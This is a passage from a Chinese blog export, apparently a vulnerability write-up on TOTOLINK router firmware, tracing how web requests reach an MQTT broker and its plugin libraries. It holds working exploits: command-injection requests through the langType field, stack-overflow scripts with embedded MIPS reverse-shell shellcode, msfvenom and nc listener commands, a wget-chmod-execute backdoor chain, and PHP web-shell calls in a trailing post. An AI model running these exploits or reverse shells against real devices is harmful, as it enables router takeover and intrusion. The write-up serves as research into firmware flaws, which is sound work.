http包的入口是`cstecgi.cgi`，最终执行设置telnet的动作是在system.so中，且字符串`setTelnetCfg`仅能在这两个文件中搜索到。\n\n在分析完`cstecgi.cgi`源码后，并未找到对system.so的调用。到这里，发现两者的联系断了！但是它们又不可能是断的，说明有一个中间件，可以将他们二者联系起来。那么有了以下分析过程：\n\n1）这个中间件肯定会调用system.so，那么二进制中一定有这个字符串。于是尝试全局搜索字符串'system.so'，But，结果为空，啥也没搜到。怎么回事呢？\n\n2）据说还有一种加载so文件的方式，那就是通过`dlopen(const char *filename, int flags)`。不过，dlopen打开so文件是需要制定路径+so文件名的，而我们刚刚搜索so文件名的结果为空，说明源码中可能对路径和文件名进行了拼接。尝试找一下路径字符串。\n\n**4、寻找对so文件所在路径的引用**\n\n对于`lib/cste_modules/system.so`，我们尝试搜索路径字符串\"lib/cste_modules\"，结果如下：\n\n```shell\nsquashfs-root$ grep -rin dlopen\nBinary file lib/libpthread-0.9.33.so matches\nBinary file lib/libcrypto.so.0.9.8 matches\nBinary file lib/libdl-0.9.33.so matches\nBinary file lib/librt-0.9.33.so matches\nBinary file bin/cs_broker matches\nBinary file bin/cste_sub matches        #满足dlopen\nBinary file bin/lighttpd matches\nBinary file bin/tc matches\nsquashfs-root$ grep -rin lib/cste_modules\nBinary file bin/cste_sub matches        #满足lib/cste_modules路径\n```\n\n根据搜索结果，锁定到`bin/cste_sub`这个二进制文件。IDA打开该文件，在函数窗口搜索dlopen，定位到唯一一处对该函数的引用：\n\n```c\nint load_modules()\n{\n...\n  v0 = opendir(&dword_4037B0);      //dword_4037B0处存放的数据其ASCII编码对应\"/lib/cste_modules/\"\n  ...\n      while ( 1 )\n    {\n      v7 = readdir(v0);         //while循环中，从\"/lib/cste_modules/\"目录将每个文件名依次取出\n      v8 = v7;\n      if ( !v7 )\n        break;\n      v3 = v7 + 11;             // v3指向readdir()函数返回结构体中的d_name，也就是目录下的文件名\n      ...\n        if ( (v5 & 0xF000) != 0x4000 )\n        {\n          sprintf(v9, v13, &dword_4037B0, v3);      //通过sprintf将目录+文件名输出给v9\n          flib = dlopen(v9, 1);                     //dlopen打开\"/lib/cste_modules/xxx.so\"\n          error_message = dlerror();\n          ...\n}\n```\n\n因此，调用system.so的程序为bin/目录下的cste_sub，这个cste_sub是做什么的呢？我们利用路由器shell一探究竟。\n\n**5、cste_sub是什么**\n\n这里我利用`python -m SimpleHTTPServer`及`wget`上传了一个完整版的`busybox-mipsel`到路由器上，通过netstat查看端口连接情况：\n\n```shell\n# ./busybox-mipsel netstat -pantu\nActive Internet connections (servers and established)\nProto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name\ntcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      1363/lighttpd\ntcp        0      0 0.0.0.0:53              0.0.0.0:*               LISTEN      1279/dnsmasq\ntcp        0      0 0.0.0.0:23              0.0.0.0:*               LISTEN      1343/telnetd\ntcp        0      0 0.0.0.0:1883            0.0.0.0:*               LISTEN      1324/cs_broker\ntcp        0    162 192.168.55.1:23         192.168.55.2:49510      ESTABLISHED 1343/telnetd\ntcp        0      0 127.0.0.1:48295         127.0.0.1:1883          TIME_WAIT   -\ntcp        0      0 127.0.0.1:47306         127.0.0.1:1883          ESTABLISHED 9913/cste_sub\ntcp        0      0 127.0.0.1:1883          127.0.0.1:47306         ESTABLISHED 1324/cs_broker\nnetstat: /proc/net/tcp6: No such file or directory\nudp        0      0 0.0.0.0:53              0.0.0.0:*                           1279/dnsmasq\nudp        0      0 0.0.0.0:67              0.0.0.0:*                           1028/udhcpd\nnetstat: /proc/net/udp6: No such file or directory\n```\n\n可以看到cste_sub作为客户端，跟1883端口建立了连接，1883端口对应的程序名是cs_broker。而1883端口对应mqtt服务，因此cs_broker就是mqtt服务。\n\n**6、再次整理思路**\n\n现在已知的几个模块有：\n\n- `cstecgi.cgi`：是lighttpd起的子进程，处理来自客户端发送的设置telnet的http包\n- `cste_sub`：该进程中加载了system.so，并实际执行了设置telnet开关的操作\n- `cs_broker`：mqtt服务，跟cste_sub之间有交互\n\n所以从cstecgi.cgi中有两条路可能触发到system.so：\n\n1）`cstecgi.cgi` --》 `cste_sub`\n\n2）`cstecgi.cgi`   --》 `cs_broker` --》 `cste_sub`\n\n为了弄清楚在`cstecgi.cgi`中究竟是怎样调用的，我们再次回到IDA中分析：\n\n```c\nint __cdecl main(int argc, const char **argv, const char **envp)\n{\n...\n  if ( strstr(v30, \"postapIpAddr\") )\n  {\n    v5 = cJSON_GetObjectItem(v18, \"postapIpAddr\");\n    set_CSTEInfo(*(_DWORD *)(v5 + 16), 1883, 60);       //看到了1883端口\n    v6 = cJSON_GetObjectItem(v18, \"aptopicurl\");\n    web_getData(0, *(_DWORD *)(v6 + 16), v30, (int)v35);\n  }\n  else\n  {\n    set_CSTEInfo(\"127.0.0.1\", 1883, 60);            //看到了1883端口\n    web_getData(0, v23, v30, (int)v35);\n  }\n...\n}\n```\n\n发现了对1883端口的调用，以及两个函数`set_CSTEInfo()`和`web_getData()`。因此符合上述2）的情况，可以大致推测出，`cstecgi.cgi`通过这两个函数实现跟`cste_broker`进行通信，而后`cste_broker`将数据传递给`cste_sub`进行处理。\n\n**7、libmosquitto**\n\n经全局搜索，`set_CSTEInfo()`与`web_getData()`的函数实现在`lib/libmosquitto.so`中。libmosquitto原本是一个开源的组件，这里TOTOLINK厂商对其进行二次开发做了些更改。可以知道的是，这两个函数实现了之间的通信。`cstecgu.cgi`到底发送了什么，我们通过网络抓包分析是更为直接和准确的办法！\n\n这一部分内容，参考MQTT相关章节。\n\n# MQTT服务\n\n关于什么是MQTT，老徐的文章里写的很清楚：[物联网设备消息总线机制的使用及安全问题](https://gtrboy.github.io/posts/bus/#0x01-mqtt%E5%8D%8F%E8%AE%AE)\n\n这里记录一下我在TOTOLINK上抓包分析MQTT报文的过程。\n\n## mqtt报文分析\n\n由于路由器上没有tcpdump，所以考虑编译一个静态链接的tcpdump，用于抓路由器上的通信报文。\n\n### 本地编译tcpdump\n\n因为第一次编tcpdump，所以先在本地编一个x86架构的版本试试。\n\n1. 官网下载tcpdump和libpcap\n\n2. 编译libpcap\n\n   ```shell\n   ./configure\n   make\n   make install\n   ```\n\n3. 编译tcpdump\n\n   ```shell\n   ./configure\n   make --without-crypto CFLAGS=-static\n   ```\n\n### 交叉编译mipsel版tcpdump \n\n1. 下载tcpdump和libpacap源码\n\n2. ubuntu中安装mipsel gcc\n\n   ```shell\n   sudo apt install gcc-mipsel-linux-gnu\n   ```\n\n3. 编译libpcap\n\n   ```shell\n   ./configure --prefix=/home/bling/mipsel_libpcap     #该目录可根据情况更改\n   make CC=mipsel-linux-gnu-gcc\n   make install CC=mipsel-linux-gnu-gcc       #编译的libpcap安装到了/home/bling/mipsel_libpcap目录下\n   ```\n\n4. 编译tcpdump\n\n   - 动态链接\n\n   ```shell\n   cd tcpdump-4.99.1/\n   ./configure\n   make CC=mipsel-linux-gnu-gcc CFLAGS='-I/home/bling/mipsel_libpcap/include' LDFLAGS='-L/home/bling/mipsel_libpcap/lib/libpcap.a'\n   ```\n\n   - 静态链接\n\n   ```shell\n   cd tcpdump-4.99.1/\n   ./configure\n   make CC=mipsel-linux-gnu-gcc CFLAGS='-I/home/bling/mipsel_libpcap/include -static' LDFLAGS='-L/home/bling/mipsel_libpcap/lib/libpcap.a -static'\n   ```\n\n### **使用tcpdump抓报文**\n\n```shell\n./tcpdump -i lo -w ./test.pcap\n```\n\n### **封闭服务器数据回传**\n\n路由器相当于一个封闭服务器，为了将路由器中tcpdump的包传给我们本地分析，有以下几种方法：\n\n- wget post\n- tftpd\n- metepreter植入后门下载（最方便）\n- base64编码\n\n1. meterpreter植入后门下载（尝试失败）\n\n2. base64编码\n\n   ```shell\n   cat /tmp/test.pcap  | /tmp/busybox-mipsel base64        # 编码过程\n   # 将base64编码的内容保存到本地文件pcap64\n   cat pcap64 | base64 -d > test.pcap          # 解码过程\n   ```\n\n另两种方法暂未尝试。\n\n### **pcap报文分析**\n\nwireshark中打开刚刚使用tcpdump捕获的pcap报文，就可以分析mqtt相关的条目了。这里附上得到的pcap文件：[test.pcap](test.pcap)\n\n其实wireshark已经根据mqtt协议都帮我们分析好了，我们可以跟踪各tcp流看看收发情况，理解一下cs_broker和cste_sub之间，以及cs_broker和cstecgi.cgi之间的数据交互过程。\n\nmqtt协议可参考：[MQTT协议中文版](https://mcxiaoke.gitbooks.io/mqtt-cn/content/)\n\n## 构造mqtt报文\n\n### **mqtt.fx的subscribe与publish**\n\n下载链接：[mqtt.fx下载](https://mqttfx.jensd.de/index.php/download)\n\n通过subscribe # 可以监听所有的topic。\n\n用mqtt.fx抓一个“打开telnet开关”的包，然后通过publish界面重放。如下图所示：\n\n![image-20210815211654119.png](image-20210815211654119.png)\n\n这一操作过程，在本地用wireshark抓了一个包，[set_telnet_1.pcapng](set_telnet_1.pcapng)。\n\n分析过程如下，根据此分析，可以使用pwntools构造mqtt报文来实现路由器telnet的开关。\n\n![image-20210815212828443.png](image-20210815212828443.png)\n\n### 利用pwntools构造\n\n根据上文中wireshark的分析，利用pwntools我们只需构造一次connect+一次setTelnetCfg就行（remote()函数本身就是建立TCP连接，因此这个层面的东西我们无需考虑）。非常简单，脚本如下：\n\n```python\nfrom pwn import *\n\nio = remote(\"192.168.55.1\",1883)\n\nmsg1 = \"\\x10\\x1a\\x00\\x04\\x4d\\x51\\x54\\x54\\x04\\x02\\x00\\x3c\\x00\\x0e\\x4d\\x51\\x54\\x54\\x5f\\x46\\x58\\x5f\\x43\\x6c\\x69\\x65\\x6e\\x74\"\nmsg2 = \"\\x30\\x65\\x00\\x24\\x74\\x6f\\x74\\x6f\\x6c\\x69\\x6e\\x6b\\x2f\\x72\\x6f\\x75\\x74\\x65\\x72\\x2f\\x73\\x65\\x74\\x74\\x69\\x6e\\x67\\x2f\\x73\\x65\\x74\\x54\\x65\\x6c\\x6e\\x65\\x74\\x43\\x66\\x67\\x7b\\x0a\\x09\\x22\\x74\\x6f\\x70\\x69\\x63\\x75\\x72\\x6c\\x22\\x3a\\x09\\x22\\x73\\x65\\x74\\x74\\x69\\x6e\\x67\\x2f\\x73\\x65\\x74\\x54\\x65\\x6c\\x6e\\x65\\x74\\x43\\x66\\x67\\x22\\x2c\\x0a\\x09\\x22\\x74\\x65\\x6c\\x6e\\x65\\x74\\x5f\\x65\\x6e\\x61\\x62\\x6c\\x65\\x64\\x22\\x3a\\x09\\x22\\x31\\x22\\x0a\\x7d\"\n\nio.send(msg1)       # connect\nsleep(0.2)\nio.send(msg2)       # setTelnetCfg 1\n```\n\n### python MQTT库构造\n\n[Python MQTT 客户端对比](https://www.emqx.com/zh/blog/comparision-of-python-mqtt-client)\n\n[如何在 Python 中使用 MQTT](https://www.emqx.com/zh/blog/how-to-use-mqtt-in-python)\n\n```python\nimport paho.mqtt.client as mqtt\n\nclient = mqtt.Client()\nclient.connect(\"192.168.55.1\",1883,60)\nclient.publish('totolink/router/setting/setTelnetCfg',payload='{\"topicurl\":\"setting/setTelnetCfg\",\"telnet_enabled\":\"1\"}')\n```\n\n# 再挖挖吧\n\n## 挖一个cs_sub中so库的命令注入\n\n在lib/cste_modules/global.so中找到如下命令注入漏洞：\n\n```c\nint __fastcall setLanguageCfg(int a1, int a2, int a3)\n{\n  const char *v6; // $s2\n  char v8[260]; // [sp+18h] [-104h] BYREF\n\n  memset(v8, 0, 0x100u);\n  v6 = (const char *)websGetVar(a2, \"langType\", \"\");\n  apmib_set(6002, v6);\n  if ( !fork() )\n  {\n    sleep(1u);\n    apmib_update_web(4);\n    exit(1);\n  }\n  CsteSystem(\"rm -rf /var/js/language* 1>/dev/null 2>&1\", 0);\n  sprintf(v8, \"cp /web_cste/js/language_%s.js /var/js/language.js\", v6);\n  CsteSystem(v8, 0);        //命令注入\n  CsteSystem(\"ln -s /var/js/language.js /web_cste/js/language.js 1>/dev/null 2>&1\", 0);\n  websSetCfgResponse(a1, a3, \"0\", \"reserv\");\n  return 0;\n}\n```\n\n有两种方式触发该漏洞：\n\n- 通过80口的http服务\n\n  ```python\n  import requests\n  \n  response = requests.post(\"http://192.168.55.1/cgi-bin/cstecgi.cgi\",data='{\"topicurl\":\"setting/setLanguageCfg\",\"langType\":\";echo 123 > /tmp/xy.txt;\"}')\n  ```\n\n- 通过1883口的mqtt服务\n\n  ```python\n  import paho.mqtt.client as mqtt\n  \n  client = mqtt.Client()\n  client.connect(\"192.168.55.1\",1883,60)\n  client.publish('totolink/router/setting/setLanguageCfg',payload='{\"topicurl\":\"setting/setLanguageCfg\",\"langType\":\";echo 123 > /tmp/tmp.txt;\"}')\n  ```\n\n以上两种方式，均可从如下三个方向进一步利用：\n\n1. 把ls等关键泄露信息，写入到通过80口可访问的文件中\n\n   只需将命令执行的结果重定向到`/web_cste`目录下的某个新建文件（如`ls > /web_cste/ls.txt`），然后在浏览器中通过`https://192.168.55.1/ls.txt`就可以查看`ls`命令的执行结果了。\n\n2. 反弹shell\n\n   未完成tag\n\n3. 开telnet\n\n   具有命令注入能力之后，开启telnet就很简单了，只不过需要注意一下`&`这个特殊字符。最后是通过`#`的注释功能打成功的。exp如下：\n\n   ```python\n   import requests\n   response = requests.post(\"http://192.168.55.1/cgi-bin/cstecgi.cgi\",data='{\"topicurl\":\"setting/setLanguageCfg\",\"langType\":\";telnetd & #;\"}')\n   ```\n\n   另外，telnetd的使用方法这里还有点迷，使用`telnetd &`可以在totolink路由器中将服务起起来，但是我自己的ubuntu虚拟机中却不行，暂时还没弄明白啥原因。记一个未完成tag。\n\n## 挖一个cs_sub中so库的栈溢出\n\n找到的栈溢出点记录：\n\n```\nfirewall.so - setIpPortFilterRules()函数 - 第72/73行 - v11\nfirewall.so - setMacFilterRules()函数 - 第87/88行 - v10\nfirewall.so - setUrlFilterRules()函数 - 第32/33行 - v9\nfirewall.so - setParentalRules()函数 - 第43/44行 - v9\nfirewall.so - setPortForwardRules()函数 - 第55行 - v13\nfirewall.so - setIpQosRules()函数 - 第34行 - v12\nfirewall.so - setMacQos()函数 - 第41/46行 - v12\n\nglobal.so - setLanguageCfg()函数 - 第16行 - v6\n```\n\n我挑了其中的一个漏洞点进一步利用，如下。\n\n### filewall.so库中setIpQosRules函数\n\n漏洞代码片段如下：\n\n```c\nint __fastcall setIpQosRules(int a1, int a2, int a3)\n{\n  ......\n  char v14[23]; // [sp+18h] [-B8h] BYREF\n  ......\n  v12 = (const char *)websGetVar(a2, \"comment\", &byte_9268);\n\t......\n  strcpy(v14, v12);\n  apmib_set(131385, v14);\n  apmib_set(65848, v14);\n  apmib_update_web(4);\n  system(\"sysconf firewall\");\n  websSetCfgResponse(a1, a3, \"0\", \"reserv\");\n  return 0;\n}\n```\n\n`strcpy(v14,v12)`拷贝时可能会导致v14溢出，该漏洞所在函数的功能简单，无漏洞利用限制条件，因此利用起来较为简单。\n\n（1）通过80口进行攻击\n\n通过80口发送利用脚本，并在mqtt.fx中订阅所有消息。但是加上shellcode的脚本总是无法到达mqtt服务节点，猜测是因为shellcode中有特殊字符，在途中被拦截了。所以考虑通过mqtt服务的1883口打。\n\n（2）通过1883口进行攻击\n\n从这个口发送是可以的。不过，还是遇到了以下两个坑：\n\n- `\\x00`截断，4字节变成3字节（不能用p32构造），巧妙利用strcpy函数会在拷贝结束加`\\x00`\n- shellcode如果布置在test所在区间，由于shellcode中引号的存在，json解析时会把我们的shellcode截断，从而无法覆盖到函数返回地址。为了绕过这个限制，我们在花括号`{}` 后植入shellcode（虽然这段shellcode不会被当做json的一部分，但是该进程接收了这些字符，那么这一段shellcode就必然在进程内存中，只要某个时段这一内存区间未被覆盖，我们就能ret2shellcode）。字符串\"bling\"是方便我们进行shellcode定位用的，在某次调试中，定位到shellcode(buf)的起始地址为0x4143b4，因此有如下利用脚本。\n\nexp如下：\n\n```python\nfrom pwn import *\nimport paho.mqtt.client as mqtt\n\nbuf = \"\\xfa\\xff\\x0f\\x24\\x27\\x78\\xe0\\x01\\xfd\\xff\\xe4\\x21\\xfd\"\nbuf += \"\\xff\\xe5\\x21\\xff\\xff\\x06\\x28\\x57\\x10\\x02\\x24\\x0c\\x01\"\nbuf += \"\\x01\\x01\\xff\\xff\\xa2\\xaf\\xff\\xff\\xa4\\x8f\\xfd\\xff\\x0f\"\nbuf += \"\\x34\\x27\\x78\\xe0\\x01\\xe2\\xff\\xaf\\xaf\\x0d\\x05\\x0e\\x3c\"\nbuf += \"\\x0d\\x05\\xce\\x35\\xe4\\xff\\xae\\xaf\\x37\\x05\\x0e\\x3c\\xc0\"\nbuf += \"\\xa8\\xce\\x35\\xe6\\xff\\xae\\xaf\\xe2\\xff\\xa5\\x27\\xef\\xff\"\nbuf += \"\\x0c\\x24\\x27\\x30\\x80\\x01\\x4a\\x10\\x02\\x24\\x0c\\x01\\x01\"\nbuf += \"\\x01\\xfd\\xff\\x11\\x24\\x27\\x88\\x20\\x02\\xff\\xff\\xa4\\x8f\"\nbuf += \"\\x21\\x28\\x20\\x02\\xdf\\x0f\\x02\\x24\\x0c\\x01\\x01\\x01\\xff\"\nbuf += \"\\xff\\x10\\x24\\xff\\xff\\x31\\x22\\xfa\\xff\\x30\\x16\\xff\\xff\"\nbuf += \"\\x06\\x28\\x62\\x69\\x0f\\x3c\\x2f\\x2f\\xef\\x35\\xec\\xff\\xaf\"\nbuf += \"\\xaf\\x73\\x68\\x0e\\x3c\\x6e\\x2f\\xce\\x35\\xf0\\xff\\xae\\xaf\"\nbuf += \"\\xf4\\xff\\xa0\\xaf\\xec\\xff\\xa4\\x27\\xf8\\xff\\xa4\\xaf\\xfc\"\nbuf += \"\\xff\\xa0\\xaf\\xf8\\xff\\xa5\\x27\\xab\\x0f\\x02\\x24\\x0c\\x01\"\nbuf += \"\\x01\\x01\"\n\ntest = \"a\"*218\n\nclient = mqtt.Client()\nclient.connect(\"192.168.55.1\",1883,60)\nclient.publish('totolink/router/setting/setIpQosRules',payload='{\"topicurl\":\"setting/setIpQosRules\",\"comment\":\"xx'+test+'\\xb4\\x43\\x41\"}'+'bling'+buf)\n```\n\nps. 使用kali生成shellcode的方法如下，需要指定攻击机的 ip和port：\n\n```bash\nmsfvenom -p linux/mipsle/shell_reverse_tcp LHOST=192.168.55.5 LPORT=2333 -f py -o mipsel919.txt\n```\n\nps. 执行攻击脚本前，需要在攻击机上监听一个端口，用来接收反弹的shell：\n\n```bash\nnc -l 2333\n```\n\n### upgrade.so库中slaveUpgrade函数\n\n漏洞代码片段如下：\n\n```c\nint __fastcall slaveUpgrade(int a1, int a2, int a3)\n{\n\t......\n  char v13[128]; // [sp+18h] [-C0h] BYREF\n  char v14[64]; // [sp+98h] [-40h] BYREF\n  ......\n  if ( getValFromTmp(\"slaveUpgradeflag\") != 1 )\n  {\n    v7 = (const char *)websGetVar(a2, \"url\", \"\");\n    strcat(v14, v7);\n    ......\n  }\n  ......\n  return 0;\n}\n```\n\n`strcat(v14, v7)`将v7的内容跟v14连接后，会导致v14溢出。根据前文“filewall.so库中setIpQosRules函数”小节中的利用方法，这个洞的调试和利用跟它很相似。\n\n这次，我们尝试用一个脚本做两件事（不需要额外开个窗口执行`nc -l 2333`），完整exp如下：\n\n```python\nfrom pwn import *\nimport paho.mqtt.client as mqtt\nimport threading\n\nbuf = \"\\xfa\\xff\\x0f\\x24\\x27\\x78\\xe0\\x01\\xfd\\xff\\xe4\\x21\\xfd\"\nbuf += \"\\xff\\xe5\\x21\\xff\\xff\\x06\\x28\\x57\\x10\\x02\\x24\\x0c\\x01\"\nbuf += \"\\x01\\x01\\xff\\xff\\xa2\\xaf\\xff\\xff\\xa4\\x8f\\xfd\\xff\\x0f\"\nbuf += \"\\x34\\x27\\x78\\xe0\\x01\\xe2\\xff\\xaf\\xaf\\x09\\x1d\\x0e\\x3c\"\nbuf += \"\\x09\\x1d\\xce\\x35\\xe4\\xff\\xae\\xaf\\x37\\x03\\x0e\\x3c\\xc0\"\nbuf += \"\\xa8\\xce\\x35\\xe6\\xff\\xae\\xaf\\xe2\\xff\\xa5\\x27\\xef\\xff\"\nbuf += \"\\x0c\\x24\\x27\\x30\\x80\\x01\\x4a\\x10\\x02\\x24\\x0c\\x01\\x01\"\nbuf += \"\\x01\\xfd\\xff\\x11\\x24\\x27\\x88\\x20\\x02\\xff\\xff\\xa4\\x8f\"\nbuf += \"\\x21\\x28\\x20\\x02\\xdf\\x0f\\x02\\x24\\x0c\\x01\\x01\\x01\\xff\"\nbuf += \"\\xff\\x10\\x24\\xff\\xff\\x31\\x22\\xfa\\xff\\x30\\x16\\xff\\xff\"\nbuf += \"\\x06\\x28\\x62\\x69\\x0f\\x3c\\x2f\\x2f\\xef\\x35\\xec\\xff\\xaf\"\nbuf += \"\\xaf\\x73\\x68\\x0e\\x3c\\x6e\\x2f\\xce\\x35\\xf0\\xff\\xae\\xaf\"\nbuf += \"\\xf4\\xff\\xa0\\xaf\\xec\\xff\\xa4\\x27\\xf8\\xff\\xa4\\xaf\\xfc\"\nbuf += \"\\xff\\xa0\\xaf\\xf8\\xff\\xa5\\x27\\xab\\x0f\\x02\\x24\\x0c\\x01\"\nbuf += \"\\x01\\x01\"\npayload1 = \"a\"*84\npayload1 += \"\\x28\\x43\\x41\"\n\ndef local_listen():\n    l = listen(2333)\n    l.wait_for_connection()\n    l.interactive()\n\ndef send_payload():\n    client = mqtt.Client()\n    client.connect(\"192.168.55.1\",1883,60)\n    client.publish('totolink/router/setting/slaveUpgrade',payload='{\"topicurl\":\"setting/slaveUpgrade\",\"url\":\"'+payload1+'\"}'+'blingha'+buf)\n\nt1 = threading.Thread(target=local_listen)\nt2 = threading.Thread(target=send_payload)\n\nt1.start()\nt2.start()\n```\n\n\n\n# 其他\n\n## 反连shell\n\n为了拿到目标系统的shell，有时候需要往目标系统中植入后门，让其将shell返回到我们本地系统中。\n\n有两种情况，一种是利用命令注入漏洞，另一种是通过内存漏洞控制执行流。\n\n### 命令注入\n\n分四步：\n\n- 生成backdoor\n\n  使用metasploit中的msfvenom生成一个目标系统架构的backdoor文件，功能是反连shell\n\n  ```bash\n  ┌──(bling㉿kali)-[~]\n  └─$ msfvenom --list payloads | grep mipsle\n      linux/mipsle/exec                                   A very small shellcode for executing commands. This module is sometimes helpful for testing purposes as well as on targets with extremely limited buffer space.\n      linux/mipsle/meterpreter/reverse_tcp                Inject the mettle server payload (staged). Connect back to the attacker\n      linux/mipsle/meterpreter_reverse_http               Run the Meterpreter / Mettle server payload (stageless)\n      linux/mipsle/meterpreter_reverse_https              Run the Meterpreter / Mettle server payload (stageless)\n      linux/mipsle/meterpreter_reverse_tcp                Run the Meterpreter / Mettle server payload (stageless)\n      linux/mipsle/reboot                                 A very small shellcode for rebooting the system. This payload is sometimes helpful for testing purposes.\n      linux/mipsle/shell/reverse_tcp                      Spawn a command shell (staged). Connect back to the attacker\n      linux/mipsle/shell_bind_tcp                         Listen for a connection and spawn a command shell\n      linux/mipsle/shell_reverse_tcp                      Connect back to attacker and spawn a command shell\n  \n  ┌──(bling㉿kali)-[~]\n  └─$ msfvenom -p linux/mipsle/shell_reverse_tcp LHOST=127.0.0.1 LPORT=2333 -f elf -o test-mipsel\n  ```\n\n- 本地起http服务\n\n  参考：[Python SimpleHTTPServer](https://www.cnblogs.com/nopnog/p/8116848.html)\n\n  服务端执行：`python -m SimpleHTTPServer`，默认监听本地8000端口\n\n  客户端：`wget http://ip:8000/xxx`或直接访问`http://ip:8000/`\n\n- 本地监听\n\n  使用 `nc -l [port]` 在本地监听一个端口，用于给backdoor连接\n\n- 命令注入\n\n  往目标系统注入如下命令：`;wget backdoor;chmod +x backdoor;./backdoor;`\n\n### 内存漏洞\n\n分三步：\n\n- 生成shellcode\n\n  使用metasploit中的msfvenom生成一个shellcode，功能是反连shell\n\n  ```bash\n  ┌──(bling㉿kali)-[~]\n  └─$ msfvenom -p linux/mipsle/shell_reverse_tcp LHOST=127.0.0.1 LPORT=2333 -f py -o test-mipsel.txt\n  # 不指定-f参数的话，生成了一个shellcode二进制文件。指定-f py生成的文件，方便写脚本使用。\n  ```\n\n- 本地监听\n\n  使用 `nc -l [port]` 在本地监听一个端口，用于shellcode连接\n\n- ret2shellcode\n\n  构造利用脚本，触发内存漏洞，控制劫持流执行shellcode\n\n## gdbserver的使用\n\ngdbserver需要搭配gdb一起使用，gdbserver运行在待测系统内部，gdb运行在我们本地。\n\n首先，我们需要让gdbserver跟待测进程建立联系，有两种方式：\n\n- 第一种方法，使用gdbserver启动程序，并设置一个端口用于跟gdb建立连接\n\n  ```bash\n  $ ./gdbserver :1234 /target/exec/\n  ```\n\n- 第二种方法，使用 `—attach` 选项附加到某个已启动进程，附加上去后程序会断在当前运行指令处\n\n  ```bash\n  $ ./gdbserver :1234 --attach [pid]\n  ```\n\n然后，让gdb跟gdbserver建立连接，这里需要根据待测进程的架构选择gdb或gdb-multiarch，有两种情况：\n\n- 第一种情况，x86或x86_64架构使用gdb\n\n  ```bash\n  $ gdb  \n  ......\n  gef > target remote [ip]:[port]\n  \n  # 或\n  $ gdb -q /target/exec\n  ......\n  gef > target remote [ip]:[port]\n  ```\n\n- 第二种情况，arm/mips等其他架构使用gdb-multiarch\n\n  ```bash\n  $ gdb-multiarch\n  ......\n  gef > set architecture [arm/mips/...]\n  gef > set endian little \n  gef > target remote [ip]:[port]\n  \n  # 或者，将以上三条命令写到文件中，然后直接使用gdb的\"-x\"参数指定配置文件\n  \n  $ gdb-multiarch -q /target/exec -x xxx.cfg\n  ......\n  gef > \n  ```\n\n## mount命令\n\n```shell\nmount -o loop /fakefolder /realfoler\numount /realfolder\n\nmount -o bind /fakefile /realfile\numount /realfile\n```\n\n## make_elf\n\nshellcode变成elf的二种方式：\n\n1. 用pwntools中make_elf（较简单）\n2. 写一个main函数，用交叉编译编成不同平台的二进制（较麻烦）\n\n## 定位漏洞函数所在的进程\n\n调试cstecgi.cgi时可能会面临这个问题\n\n## lighttpd\n\n...\n\n## 串口拿shell\n\n...\n\n","tags":["totolink","gdbserver","mqtt","路由器"],"categories":["漏洞复现"]},{"title":"网络渗透的基本技能","url":"/2021/08/09/basic-skills-of-pen-test/","content":"\n\n这篇文章没什么实际内容，关于环境搭建请参考：https://www.cnblogs.com/wkzb/p/12358076.html\n\n\n# 靶场环境\n\n```\nkali：192.168.125.130\nwin7：192.168.52.143/192.168.125.129\nwindows2003：192.168.52.141\nwindows2008：192.168.52.138\n```\n\npost curl\n\n```\ncurl -d \"x=system('dir');\" http://192.168.125.129/she.php\n```\n\nget 地址栏\n\n```\n192.168.125.129/she.php?x=system(%27whoami%27);\n```\n\n\n\n\n\n# 虚拟机网络的三种模式\n\n对于宿主机与虚拟机之间的网络匹配模式，VMware中一共有三种：NAT，仅主机，桥接。\n\n## NAT模式\n\nNAT，即网络地址转换NAT模式在宿主机上表现为VMnet8虚拟网卡。在虚拟机内执行`route print`或`route`会看到两条路由表。\n\n```\nKernel IP routing table\nDestination     Gateway         Genmask         Flags Metric Ref    Use Iface\ndefault         192.168.150.2   0.0.0.0         UG    100    0        0 eth0\n192.168.150.0   0.0.0.0         255.255.255.0   U     100    0        0 eth0\n```\n\nNAT模式以host主机（192.168.150.1）作为网关，vmware替host主机实现了一个NAT功能（192.168.150.2），因此虚拟机通过host主机进行网络地址转换后，以host主机的ip地址向外部ip发起连接。此时可以把host主机看作我们家里用的路由器。\n\n## 仅主机模式\n\n仅主机模式在宿主机上表现为VMnet1虚拟网卡。在虚拟机内执行`route print`或`route`只会看到一条路由表。\n\n```\nKernel IP routing table\nDestination     Gateway         Genmask         Flags Metric Ref    Use Iface\n192.168.125.0   0.0.0.0         255.255.255.0   U     100    0        0 eth0\n```\n\n这里分两种情况：\n\n- 1、将虚拟机网络连接到主机虚拟适配器。此时虚拟机可以ping通同一网段的其他主机，因其以192.168.125.1作为网关，且能ping通。（这里我理解为host主机不给虚拟机提供NAT功能了，但是由于虚拟机网络连到了host主机网络上，因此可以在以host主机为网关且网络号相同的主机之间进行通信。相当于形成了一个小型局域网）\n- 2、取消将虚拟机网络连接到主机虚拟适配器。此时在虚拟机内无法ping通任何其他主机或网关，相当于一台没有接网线没有连wifi，因此跟外界没有任何通信的主机。\n\n## 桥接模式\n\n桥接模式可以将虚拟机桥接到host主机的某个网卡上。此时会分配给虚拟一个跟host主机网络号相同的ip地址，可以看作在网络中新增加了一台主机，只不过虚拟机和host机两个共用同一网卡。进入路由器管理界面，我们可以看到同一设备下有两个ip地址分时出现，即对一张网卡的分时复用。\n\n# nmap\n\n常用命令：\n\n```\nnmap <ip> 扫描目标主机，获取基本信息\nnmap -A -p- <IP> 全面扫描目标主机开放的端口\nnmap -O <ip> 扫描目标主机的操作系统类型\nnmap -sT TCP扫描\nnmap -sS SYN扫描\nnmap -sP PING扫描\nnmap -sU UDP扫描\n```\n\n\n\n\n\n# http\n\n- 了解\n- http包\n\nhttp，Hyper Text Transfer Protocol，超文本传输协议。它是用于从服务器传输超文本标记语言（HTML）到客户端的传送协议。\n\nHTTP协议通常用于B/S架构（Browser/Client）。浏览器作为http的客户端，通过URL向http服务端即web服务器发送请求。http服务端根据请求再发送响应。\n\n参考[十分钟搞懂HTTP和HTTPS协议？](https://zhuanlan.zhihu.com/p/72616216)这篇文章，可以对http、https、ssl、tls有个初步的认识。\n\n另一篇[关于HTTP协议，一篇就够了](https://www.jianshu.com/p/80e25cb1d81a)\n\n\n\n\n\n# phpstudy\n\n- 1、学php\n- 2、apache php的工作原理\n\n- 3、学mysql\n- 4、mysql工作原理\n\n1、熟悉了一下phpstudy这个工具：[phpstudy 2016 